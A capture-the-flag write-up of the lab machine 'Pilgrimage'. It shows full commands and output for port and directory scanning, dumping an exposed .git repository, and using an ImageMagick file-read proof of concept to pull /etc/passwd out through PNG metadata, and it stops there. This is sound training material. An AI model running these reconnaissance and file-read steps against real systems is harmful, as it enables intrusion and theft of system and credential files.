# CTF Writeup: Pilgrimage

## Lab Description

Pilgrimage is an easy-difficulty Linux machine featuring a web application with an exposed `Git` repository. Analysing the underlying filesystem and source code reveals the use of a vulnerable version of `ImageMagick`, which can be used to read arbitrary files on the target by embedding a malicious `tEXT` chunk into a PNG image. The vulnerability is leveraged to obtain a `SQLite` database file containing a plaintext password that can be used to SSH into the machine. Enumeration of the running processes reveals a `Bash` script executed by `root` that calls a vulnerable version of the `Binwalk` binary. By creating another malicious PNG, `CVE-2022-4510` is leveraged to obtain Remote Code Execution (RCE) as `root`. 

---

## Reconaissance

An initial service enumeration scan reveals:

```
nmap -A -p- --min-rate 10000 10.129.55.231
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 09:23 EDT
Nmap scan report for 10.129.55.231
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   18.03 ms 10.10.14.1
2   18.96 ms 10.129.55.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.90 seconds
```

The http information tells us that it tries to redirect us to the domain pilgirmage.htb, but wasn't successful. Let's map the domain to our target ip in our local dns file /etc/hosts

```
sudo echo "10.129.55.231 pilgrimage.htb" | sudo tee -a /etc/hosts
```

Ran dirsearch to potentially find hidden entpoints --> Discovered an publicly accessible /.git repository.


```
dirsearch -u http://pilgrimage.htb          
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/reports/http_pilgrimage.htb/_25-10-20_09-41-30.txt

Target: http://pilgrimage.htb/

[09:41:31] Starting: 
[09:41:32] 301 -  169B  - /.git  ->  http://pilgrimage.htb/.git/            
[09:41:32] 403 -  555B  - /.git/                                            
[09:41:32] 200 -   92B  - /.git/config
[09:41:32] 200 -   73B  - /.git/description                                 
[09:41:32] 200 -    2KB - /.git/COMMIT_EDITMSG
[09:41:32] 403 -  555B  - /.git/hooks/                                      
[09:41:32] 403 -  555B  - /.git/info/                                       
[09:41:32] 200 -    4KB - /.git/index                                       
[09:41:32] 403 -  555B  - /.git/branches/
[09:41:32] 200 -  240B  - /.git/info/exclude
[09:41:32] 200 -   23B  - /.git/HEAD                                        
[09:41:32] 403 -  555B  - /.git/logs/                                       
[09:41:32] 200 -  195B  - /.git/logs/HEAD                                   
[09:41:32] 301 -  169B  - /.git/logs/refs  ->  http://pilgrimage.htb/.git/logs/refs/
[09:41:32] 301 -  169B  - /.git/logs/refs/heads  ->  http://pilgrimage.htb/.git/logs/refs/heads/
[09:41:32] 200 -  195B  - /.git/logs/refs/heads/master                      
[09:41:32] 403 -  555B  - /.git/objects/                                    
[09:41:32] 403 -  555B  - /.git/refs/
[09:41:32] 301 -  169B  - /.git/refs/heads  ->  http://pilgrimage.htb/.git/refs/heads/
[09:41:32] 301 -  169B  - /.git/refs/tags  ->  http://pilgrimage.htb/.git/refs/tags/
[09:41:32] 200 -   41B  - /.git/refs/heads/master                           
[09:41:32] 403 -  555B  - /.ht_wsr.txt                                      
[09:41:32] 403 -  555B  - /.htaccess.bak1                                   
[09:41:32] 403 -  555B  - /.htaccess.sample                                 
[09:41:32] 403 -  555B  - /.htaccess.save
[09:41:32] 403 -  555B  - /.htaccess.orig
[09:41:32] 403 -  555B  - /.htaccess_extra                                  
[09:41:32] 403 -  555B  - /.htaccess_orig
[09:41:32] 403 -  555B  - /.htaccessBAK
[09:41:32] 403 -  555B  - /.htaccessOLD2
[09:41:32] 403 -  555B  - /.htaccessOLD                                     
[09:41:32] 403 -  555B  - /.html                                            
[09:41:32] 403 -  555B  - /.htaccess_sc
[09:41:32] 403 -  555B  - /.htm
[09:41:32] 403 -  555B  - /.htpasswd_test                                   
[09:41:32] 403 -  555B  - /.htpasswds
[09:41:32] 403 -  555B  - /.httr-oauth                                      
[09:41:39] 301 -  169B  - /assets  ->  http://pilgrimage.htb/assets/        
[09:41:39] 403 -  555B  - /assets/                                          
[09:41:43] 302 -    0B  - /dashboard.php  ->  /login.php                    
[09:41:49] 200 -    6KB - /login.php                                        
[09:41:49] 302 -    0B  - /logout.php  ->  /                                
[09:41:54] 200 -    6KB - /register.php                                     
[09:42:01] 403 -  555B  - /tmp/                                             
[09:42:01] 301 -  169B  - /tmp  ->  http://pilgrimage.htb/tmp/
[09:42:03] 403 -  555B  - /vendor/                                          
                                                                             
Task Completed
```

/.git/COMMIT_EDITMSG provides us with the following content, we are able to enumerate an user on the target
called "emily"

```
Pilgrimage image shrinking service initial commit.
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# Author:    emily <emily@pilgrimage.htb>
#
# On branch master
#
# Initial commit
#
# Changes to be committed:
#	new file:   assets/bulletproof.php
#	new file:   assets/css/animate.css
#	new file:   assets/css/custom.css
#	new file:   assets/css/flex-slider.css
#	new file:   assets/css/fontawesome.css
#	new file:   assets/css/owl.css
#	new file:   assets/css/templatemo-woox-travel.css
#	new file:   assets/images/banner-04.jpg
#	new file:   assets/images/cta-bg.jpg
#	new file:   assets/js/custom.js
#	new file:   assets/js/isotope.js
#	new file:   assets/js/isotope.min.js
#	new file:   assets/js/owl-carousel.js
#	new file:   assets/js/popup.js
#	new file:   assets/js/tabs.js
#	new file:   assets/webfonts/fa-brands-400.ttf
#	new file:   assets/webfonts/fa-brands-400.woff2
#	new file:   assets/webfonts/fa-regular-400.ttf
#	new file:   assets/webfonts/fa-regular-400.woff2
#	new file:   assets/webfonts/fa-solid-900.ttf
#	new file:   assets/webfonts/fa-solid-900.woff2
#	new file:   assets/webfonts/fa-v4compatibility.ttf
#	new file:   assets/webfonts/fa-v4compatibility.woff2
#	new file:   dashboard.php
#	new file:   index.php
#	new file:   login.php
#	new file:   logout.php
#	new file:   magick
#	new file:   register.php
#	new file:   vendor/bootstrap/css/bootstrap.min.css
#	new file:   vendor/bootstrap/js/bootstrap.min.js
#	new file:   vendor/jquery/jquery.js
#	new file:   vendor/jquery/jquery.min.js
#	new file:   vendor/jquery/jquery.min.map
#	new file:   vendor/jquery/jquery.slim.js
#	new file:   vendor/jquery/jquery.slim.min.js
#	new file:   vendor/jquery/jquery.slim.min.map
#
```

Decided to utilize the tool called "git-dumper" to dump the whole git repository on my local machine, to see all commits.

Since Kali Linux doesn't allow pip running in an non-virtual-environment anymore, we will start our virtual env up.

```
python3 -m venv myenv
source /myenv/bin/activate
```

Installing git-dumper

```
pip install git-dumper
```

Running git-dumper 

```
git-dumper http://pilgrimage.htb/.git ../../Exploiting/OSCP_Prep/HTB/Pilgrimage 
Warning: Destination '../../Exploiting/OSCP_Prep/HTB/Pilgrimage' is not empty
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
[-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
[-] Fetching http://pilgrimage.htb/.git/index [200]
[-] Finding refs/
[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/main [404]
[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
[-] http://pilgrimage.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
[-] Fetching http://pilgrimage.htb/.git/config [200]
[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/staging [404]
[-] http://pilgrimage.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/development [404]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/logs/refs/heads/development responded with status code 404
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/production [404]
[-] http://pilgrimage.htb/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/main [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/staging [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/production [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/development [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/refs/heads/main [404]
[-] http://pilgrimage.htb/.git/refs/heads/main responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
[-] http://pilgrimage.htb/.git/packed-refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/staging [404]
[-] http://pilgrimage.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/production [404]
[-] http://pilgrimage.htb/.git/refs/heads/production responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/development [404]
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/main [404]
[-] http://pilgrimage.htb/.git/refs/heads/development responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master [404]
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code 404
[-] http://pilgrimage.htb/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/staging [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/production [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/development [404]
[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/development responded with status code 404
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/main [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/development [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/production [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad [200]
[-] Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .
```

We now have gained the whole git repository and there's an interesting binary called "magick".
When executing it, we get the information about "ImageMagick 7.1.2" being used. 


```
magick
Version: ImageMagick 7.1.2-3 Q16 x86_64 23340 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC Modules OpenMP(4.5) 
Delegates (built-in): bzlib djvu fftw fontconfig freetype heic jbig jng jp2 jpeg lcms lqr ltdl lzma openexr pangocairo png raw tiff webp wmf x xml zlib zstd
Compiler: gcc (14.3)
Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
```

Let's look up for some CVE's!

```
searchsploit ImageMagick                                         
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
GeekLog 2.x - 'ImageImageMagick.php' Remote File Inclusion                     | php/webapps/3946.txt
ImageMagick - Memory Leak                                                      | multiple/local/45890.sh
ImageMagick 6.8.8-4 - Local Buffer Overflow (SEH)                              | windows/local/31688.pl
ImageMagick 6.9.3-9 / 7.0.1-0 - 'ImageTragick' Delegate Arbitrary Command Exec | multiple/local/39791.rb
ImageMagick 6.x - '.PNM' Image Decoding Remote Buffer Overflow                 | linux/dos/25527.txt
ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow                | linux/dos/28383.txt
ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities       | multiple/dos/39767.txt
ImageMagick 7.1.0-49 - Arbitrary File Read                                     | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                     | php/dos/51256.txt
Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution (RCE) (Authe | php/webapps/51025.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Decided to utilize the following PoC, since other's didn't workout properly.

```
https://github.com/Sybil-Scan/imagemagick-lfi-poc
```

Generated an .png file which should displays us the /etc/passwd file of the target.


```
python3 generate.py -f "/etc/passwd" -o exploit.png                                          

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png
```

Uploaded the file on the webpage and got an compressed .png file back, from the logic we should now gain an file which has the data of the /etc/passwd file of the target saved up, in his metadata.

```
wget http://pilgrimage.htb/shrunk/68f7632e4e352.png
```

After downloading the file, let's inspect the metadata inside and check if we were successful.


```
exiftool 68f7632e4e352.png 
ExifTool Version Number         : 13.25
File Name                       : 68f7632e4e352.png
Directory                       : .
File Size                       : 1688 bytes
File Modification Date/Time     : 2025:10:21 06:40:46-04:00
File Access Date/Time           : 2025:10:21 06:44:12-04:00
File Inode Change Date/Time     : 2025:10:21 06:44:12-04:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 128
Image Height                    : 128
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Gamma                           : 2.2
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 255 255 255
Modify Date                     : 2025:10:21 10:40:46
Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d.65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a.2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a.783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372.2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73.706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31.303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f.6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573.722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d.646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b.75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f.7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69.7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67.696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73.62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d.5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e.6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334.3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e.2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374.656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72.6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65.6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e.0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052.65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973.74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573.796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69.7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c.6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d.652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78.3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f.7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f.737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938.3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a.


Yes we were, let's convert our .png file from hex to str, to be able to see the /etc/passwd file.
```
Convert .png file

```
convert 68f7632e4e352.png result.png
```

Let's save up the hex values, stored in the metadata of the .png file and save it into an .hex file and convert it to str.

```
cat passwd.hex | xxd -r -p 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
